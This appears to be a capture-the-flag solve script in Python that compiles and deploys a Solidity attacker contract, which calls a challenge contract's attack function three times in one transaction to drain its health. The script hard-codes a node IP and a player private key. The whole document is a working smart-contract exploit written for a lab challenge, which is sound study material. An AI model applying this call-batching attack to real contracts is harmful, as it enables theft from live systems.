from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version

install_solc("0.8.28")
set_solc_version("0.8.28")

w3 = Web3(Web3.HTTPProvider("http://94.237.48.147:30860/"))

player_key = "0x822491148237ecb8a4ca4e074cac035358d3c4807c3b226836fb21da852ae3b0"
player_addr = "0xFa6c0555d8A61Aef8D9EBFa39d1Ca0EE57Fe174b"
target_addr = "0xFc5eFbB130087161448Cb85BC957A493e017f87E"

eldorion_src = open('Eldorion.sol').read()

slayer_src = """
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
}

contract EldorionSlayer {
    function slay(address target) external {
        IEldorion(target).attack(100);
        IEldorion(target).attack(100);
        IEldorion(target).attack(100);
    }
}
"""

compiled_eldorion = compile_source(eldorion_src, output_values=['abi'])
compiled_slayer = compile_source(slayer_src, output_values=['abi', 'bin'])

eldorion = w3.eth.contract(
    address=target_addr, abi=compiled_eldorion['<stdin>:Eldorion']['abi']
)

slayer = w3.eth.contract(
    abi=compiled_slayer['<stdin>:EldorionSlayer']['abi'],
    bytecode=compiled_slayer['<stdin>:EldorionSlayer']['bin']
)

def tx(fn, value=0):
    txn = fn.build_transaction({
        'from': player_addr,
        'nonce': w3.eth.get_transaction_count(player_addr),
        'gas': 500000,
        'gasPrice': w3.to_wei('20', 'gwei'),
        'value': value,
        'chainId': w3.eth.chain_id
    })
    signed = w3.eth.account.sign_transaction(txn, player_key)
    return w3.eth.wait_for_transaction_receipt(
        w3.eth.send_raw_transaction(signed.raw_transaction)
    )

print(f"Initial health: {eldorion.functions.health().call()}")



slayer_addr = tx(slayer.constructor()).contractAddress
print(f"Slayer deployed at: {slayer_addr}")
slayer_inst = w3.eth.contract(address=slayer_addr, abi=slayer.abi)
tx(slayer_inst.functions.slay(target_addr))


print(f"Final health: {eldorion.functions.health().call()}")
